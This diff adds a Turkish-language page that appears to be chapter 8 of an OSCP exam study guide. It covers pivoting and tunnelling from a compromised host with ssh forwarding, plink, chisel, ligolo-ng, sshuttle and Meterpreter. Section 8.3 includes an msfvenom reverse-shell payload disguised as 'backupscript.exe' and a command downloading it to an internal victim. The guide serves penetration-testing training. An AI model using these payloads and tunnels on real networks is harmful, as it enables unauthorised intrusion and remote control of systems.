@@ -1,0 +1,297 @@
+---
+layout: page
+title: "Bölüm 8 — Pivoting & Tünelleme"
+oscp: true
+toc: true
+permalink: /oscp/08-pivoting/
+---
+
+{% raw %}
+Bu bölüm, ele geçirilmiş bir host üzerinden iç (dahili) ağdaki hedeflere erişmek
+için kullanılan tünelleme tekniklerini kapsar. Kural: **önce erişilebilirliği
+ispatla, sonra trafiği yönlendir.** Tünel kurmadan önce pivot host'un kendi
+bağlamında (arp tablosu, route, interface'ler) hangi ağları gördüğünü doğrula.
+
+## 8.1 Pivot host'ta keşif (her tünelden önce)
+
+**Ne / ne zaman:** Pivot host hangi iç ağlara baktığını öğrenmek için. Yanlış
+subnet'e tünel kurmak en sık hata.
+
+```bash
+# Bağlı interface'ler ve subnet'ler
+ip a
+
+# Erişilebilir komşu host'lar (L2 görünürlüğü)
+ip neigh
+arp -a
+
+# Aktif bağlantılar / dinleyen servisler
+sudo ss -ntplu
+netstat -antp
+
+# Hızlı port taraması (nmap yoksa) — iç subnet boyunca
+for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445 2>&1 | grep -i open; done
+```
+
+**Tuzaklar / notlar:**
+- `ip neigh` yalnızca L2'de görünen host'ları gösterir; farklı VLAN/subnet'ler
+  için routing tablosuna (`ip route`) ve DNS cache'e bak.
+- İç hostlarda ICMP genelde kapalıdır (Windows Defender Firewall) — host-alive
+  kontrolleri yanıltıcı olabilir; doğrudan port tara.
+- Pivot host'un saati, proxy ayarları ve `/etc/hosts` kayıtları iç keşfi
+  değiştirir; önce `env | grep -i proxy` yap.
+
+## 8.2 Local port forwarding (`ssh -L`)
+
+**Ne / ne zaman:** Attack makinesinden pivot hosta SSH erişimin varsa ve pivot
+hostun **görebildiği** bir servise (senden görünmeyen iç IP:port) kendi
+localhost portun üzerinden erişmek istiyorsan. Tek servis, tek port senaryosu.
+
+```bash
+# Kendi localhost:4455 -> pivot üzerinden 172.16.50.217:445
+ssh -N -L 0.0.0.0:4455:172.16.50.217:445 <KULLANICI>@<PIVOT_IP>
+
+# RDP örneği: kendi localhost:13389 -> iç host 3389
+ssh -N -L 13389:172.16.5.19:3389 <KULLANICI>@<PIVOT_IP>
+xfreerdp /v:127.0.0.1:13389 /u:<KULLANICI> /p:'<PAROLA>'
+
+# Birden çok port aynı anda
+ssh -N -L 1234:localhost:3306 -L 8080:localhost:80 <KULLANICI>@<PIVOT_IP>
+```
+
+**Tuzaklar / notlar:**
+- `-N` shell açmaz, yalnızca forward yapar. `-v` ile debug et; tünel çalışmıyorsa
+  ilk bakılacak yer SSH'in hangi host:port'a bağlandığıdır (`ssh -vN ...`).
+- Dinleme adresi default 127.0.0.1'dir; başka makinelerin de kullanması için
+  `0.0.0.0` öneki gerekir.
+- İç host, trafiği pivot hostun IP'sinden görür; kaynak gizleme gerekiyorsa
+  SOCKS/DNAT tabanlı çözümlere geç.
+
+## 8.3 Remote port forwarding (`ssh -R`)
+
+**Ne / ne zaman:** Pivot host dışarıya (sana) doğrudan bağlanamıyor ama sen
+ona SSH atabiliyorsan; pivot hostun içerdeki bir servisini ya da **iç ağdan
+gelen reverse bağlantıyı** kendi makinene taşımak için.
+
+```bash
+# Pivot hostta çalışır: pivot'un içerdeki 10.4.50.215:5432 -> senin localhost:2345
+ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 <KULLANICI>@<ATTACK_IP>
+
+# İç ağdaki Windows hedefin reverse shell'i sana dönsün:
+# 1) msfvenom ile payload üret (LHOST = PIVOT'un iç IP'si, LPORT = pivottaki dinleme)
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<PIVOT_IC_IP> LPORT=8080 -f exe -o backupscript.exe
+
+# 2) Pivot hostta (içeri hizmet edecek) reverse forward kur
+ssh -N -R <PIVOT_IC_IP>:8080:0.0.0.0:8000 <KULLANICI>@<PIVOT_IP> -vN
+#    içerdeki hedef  PIVOT_IC_IP:8080'e bağlanır -> senin 0.0.0.0:8000'ine düşer
+
+# 3) Payload'ı iç hosta indir
+PS C:\> Invoke-WebRequest -Uri "http://<PIVOT_IC_IP>:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
+```
+
+**Tuzaklar / notlar:**
+- GatewayPorts kapalıysa `-R` default 127.0.0.1'de dinler; uzak makinelerin
+  bağlanması için sunucuda `GatewayPorts yes` veya bind adresi açıkça verilmeli.
+- Reverse forward için SSH'in **kullanıcı bazlı** değil makine bazlı açık olması
+  gerekir; yetkisiz kullanıcıyla `-R` sessizce başarısız olabilir, `-v` ile bak.
+
+## 8.4 Dynamic forwarding + proxychains (`ssh -D`)
+
+**Ne / ne zaman:** Tek servis değil, **iç ağın tamamına** çoklu protokolle
+(brower, nmap, smbclient, exploit) erişmek için. SOCKS proxy kurup proxychains
+ile sararsın.
+
+```bash
+# SOCKS5 proxy aç: kendi localhost:9999 üzerinden pivot'un eriştiği her yere
+ssh -N -D 0.0.0.0:9999 <KULLANICI>@<PIVOT_IP>
+
+# /etc/proxychains.conf son satırı:
+socks5 192.168.50.63 9999
+
+# Proxychains her araçla çalışır
+proxychains nmap -v -Pn -sT 172.16.5.19
+proxychains xfreerdp /v:172.16.5.19 /u:<KULLANICI> /p:'<PAROLA>'
+proxychains smbclient //172.16.5.19/share -U <DOMAIN>/<KULLANICI>
+```
+
+**Tuzaklar / notlar:**
+- proxychains altında nmap **yalnızca `-sT` (full TCP connect)** verir doğru
+  sonuç; SYN/half-scan proxychains'in anlayamadığı kısmi paketler üretir.
+- Tarama çok yavaşsa `/etc/proxychains.conf` içinde
+  `tcp_read_time_out` / `tcp_connect_time_out` değerlerini 800–1200 arasına çek.
+- Windows 10 1803+ ile gelen `ssh.exe` (>7.6) remote dynamic forwarding
+  (`ssh -R 9998`) de destekler — Windows pivot hostlarda plink şart değil:
+
+```powershell
+# Windows pivot hostta: dinamik reverse SOCKS -> senin makinende 127.0.0.1:9998
+ssh.exe -N -R 9998 <KULLANICI>@<ATTACK_IP>
+# proxychains.conf: socks5 127.0.0.1 9998
+```
+
+## 8.5 Plink (Windows pivot, GUI'siz)
+
+**Ne / ne zaman:** Windows hedefte OpenSSH yoksa, komut satırından SSH
+tüneli kurmak için. **Remote dynamic forwarding plink'te yok.**
+
+```powershell
+# Reverse forward: hedefin 3389'u -> senin 127.0.0.1:9833
+C:\Windows\Temp\plink.exe -ssh -l <KULLANICI> -pw '<PAROLA>' -R 127.0.0.1:9833:127.0.0.1:3389 <ATTACK_IP>
+
+# Non-TTY shell'de host-key onayını otomatikleştir
+cmd.exe /c echo y | .\plink.exe -ssh -l <KULLANICI> -pw '<PAROLA>' -R 127.0.0.1:9833:127.0.0.1:3389 <ATTACK_IP>
+```
+
+**Tuzaklar / notlar:**
+- Kritik: plink tünelini **shell'i olan bir kullanıcı** ile aç; yetkisi kısıtlı
+  servis hesaplarıyla port forward sessizce çalışmaz.
+- Host-key sorusu ilk bağlantıda çıkar; `echo y` hattı bunu geçer. Sessizce
+  başarısızsa `-v` eklemek yerine önce interaktif shell ile host-key'i cache'le.
+- Parola komut satırında görünür; geçici kullan, iş bitince tüneli kapat.
+
+## 8.6 Chisel (çift yönlü, hızlı)
+
+**Ne / ne zaman:** SSH yok/kısıtlıysa, tek binary ile hızlı ve çift yönlü
+(SOCKS + TCP forward/reverse) tünel. Reverse modda içeriden dışarıya sadece
+outbound 8383 gerekir.
+
+```bash
+# Attack makinesi (server, reverse mod açık)
+chisel server -p 8383 --reverse
+
+# Pivot/victim host (client): R: ile reverse port forward
+#   senin localhost:80 -> victim üzerinden 172.16.159.241:80
+.\chisel.exe client <ATTACK_IP>:8383 R:80:172.16.159.241:80
+
+# Reverse SOCKS: senin makinende socks dinler, victim'in gördüğü ağa çıkar
+.\chisel.exe client <ATTACK_IP>:8383 R:socks
+# proxychains.conf: socks5 127.0.0.1 1080
+```
+
+**Tuzaklar / notlar:**
+- `R:port:host:port` sözdiziminde ilk port **senin** dinlediğin, ikinci kısım
+  victim'in gittiği hedef; karıştırırsan tünel sessizce boş döner.
+- Trafiği hızlandırmak için birden çok chisel bağlantısı paralel kurulabilir;
+  yüksek gecikmede SSH'den belirgin hızlıdır.
+- Binary'yi hedefe taşırken AV imzasına takılabilir; bkz. [Bölüm 9](/oscp/09-istemci-av/).
+
+## 8.7 Ligolo-ng (Layer 3, tam rota)
+
+**Ne / ne zaman:** Sadece tek port değil, **iç subnetin tamamına Layer 3
+routing** ile erişmek için. Nmap/ICMP dahil her şey doğal çalışır; SOCKS
+sarması gerekmez.
+
+```bash
+# Attack makinesi — TUN arayüzü hazırla (her seferinde)
+sudo ip tuntap add user <KULLANICI> mode tun ligolo
+sudo ip link set ligolo up
+
+# Ligolo proxy sunucusu başlat (default 11601/tcp)
+./proxy -selfcert
+
+# Pivot host (agent)
+./agent -connect <ATTACK_IP>:11601 --ignore-cert
+
+# Proxy CLI'da: session listele, seç
+ligolo-ng » session
+ligolo-ng » 1
+
+# İç subneti ligolo arayüzüne route et
+sudo ip route add 192.168.0.0/24 dev ligolo
+
+# Tüneli başlat
+ligolo-ng » start
+```
+
+**Tuzaklar / notlar:**
+- `--ignore-cert` self-signed sertifikada gerekir; prod'da kendi sertifikanı kullan.
+- Rota eklerken `/24` yerine gerçek CIDR'i yaz; yanlış maske taramanın bir
+  kısmının kaybolmasına yol açar.
+- Multi-agent için `session` ile pivotlar arasında sıçrama (double pivot)
+  kurulabilir; her katman için ayrı route ekle.
+
+## 8.8 sshuttle (VPN benzeri, sıfır kurulum)
+
+**Ne / ne zaman:** SSH erişimin var ve iç subneti **doğrudan** (nmap, browser,
+her araç proxy'siz) kullanmak istiyorsan. Kurban tarafında root dışı python
+gerekir; senin tarafında hiçbir konfig yok.
+
+```bash
+# İç subnetin tamamını SSH üzerinden route'la; pivot hostun kendi IP'sini exclude et
+sudo sshuttle -r <KULLANICI>@<PIVOT_IP> 10.10.10.0/24 -x 10.10.10.5
+
+# Anahtarlı bağlantıyla
+sudo sshuttle -r <KULLANICI>@<PIVOT_IP> --ssh-cmd "ssh -i id_rsa" 10.10.10.0/24 -x 10.10.10.5
+```
+
+**Tuzaklar / notlar:**
+- `-x` ile pivot hostun kendi iç IP'sini dışla; aksi halde sshuttle kendi
+  bağlantısını da route'layıp döngüye girer.
+- DNS için `--dns` bayrağı ekle; iç hostnameleri çözmek istiyorsan şart.
+- UDP'yi tam taşımaz (TCP tam destek); DNS-UDP dışındaki UDP protokoller
+  (örn. bazı Kerberos senaryoları) için ligolo düşün.
+
+## 8.9 Meterpreter ile pivoting (`autoroute` + `portfwd`)
+
+**Ne / ne zaman:** Zaten Meterpreter session'ın varsa; MSF modüllerini iç ağa
+yöneltmek için. Not: pivot üzerinden reverse shell yerine **bind payload**
+gerekir (MSF'in route'ladığı iç ağda dışarı dönüş olmayabilir).
+
+```bash
+# Session içinde
+meterpreter> ipconfig                    # iç subnetleri gör
+meterpreter> run autoroute -s 10.2.21.0/20   # subnet'i MSF route'una ekle
+meterpreter> sessions -n victim_1 -i 1     # session'a isim ver, arka planla
+
+# Port forward (Meterpreter seviyesinde)
+meterpreter> portfwd add -l 1234 -p 80 -r 10.2.17.11
+meterpreter> portfwd list
+meterpreter> portfwd delete -l 3389 -p 3389 -r 10.2.17.11
+meterpreter> portfwd flush
+# Artık senin localhost:1234 -> 10.2.17.11:80
+```
+
+**Tuzaklar / notlar:**
+- `autoroute` yalnızca MSF trafiğini route'lar; proxychains ile sarılmış
+  harici araçlar etkilenmez. Bunun için SOCKS modülü:
+
+```bash
+use auxiliary/server/socks_proxy
+set SRVHOST 127.0.0.1
+set SRVPORT 9050
+run
+# proxychains.conf: socks5 127.0.0.1 9050
+```
+
+- İç ağda bind payload kullanırken MSF `LHOST`'unu **pivot'un route'lanmış
+  interface'i** olarak ayarla; aksi halde payload sana değil yanıt vermez.
+- Tünel koparsa `portfwd` kuralları session ile birlikte ölür; script
+  otomasyonunda yeniden kur.
+
+## 8.10 Hangi teknik ne zaman (karar matrisi)
+
+| Durum | Teknik |
+|---|---|
+| Tek servise erişim, SSH var | `ssh -L` |
+| İç hostdan reverse shell almak, SSH var | `ssh -R` |
+| İç ağın tamamına çoklu araç, SSH var | `ssh -D` + proxychains (`-sT` nmap) |
+| Windows hedef, OpenSSH yok | plink (`-R`), ya da ssh.exe (1803+) |
+| SSH yok/kısıtlı, hızlı tek binary | chisel (`--reverse`, `R:`, `R:socks`) |
+| Tüm subnete L3 routing, ICMP dahil | ligolo-ng |
+| Sıfır konfig, subneti doğal kullanmak | sshuttle |
+| MSF modüllerini iç ağa yöneltmek | `autoroute` + `portfwd` / `socks_proxy` |
+
+**Genel ilkeler:**
+- Tek port → port forward; çok hedef → SOCKS/DNAT (proxychains, chisel, ligolo).
+- Kurban inbound kabul etmiyorsa → reverse tünel (`-R`, chisel `--reverse`,
+  ligolo agent outbound).
+- Her tünel kurulduktan sonra doğrulama: `curl`, `nc`, `nmap -sT` ile tek host
+  test et; tüm subneti hemen tarama.
+- Parola/private key hiçbir zaman komut satırı geçmişinde kalmamalı; tünel
+  bitince `portfwd flush` / bağlantıyı kapat. Credential dump'ı için bkz.
+  [Bölüm 7](/oscp/07-ad-saldirilari/), iz sürmeyi temizlemek için aynı bölümdeki
+  OPSEC notları.
+
+---
+
+[← Bölüm 7](/oscp/07-ad-saldirilari/) · [Bölüm 9 →](/oscp/09-istemci-av/)
+{% endraw %}
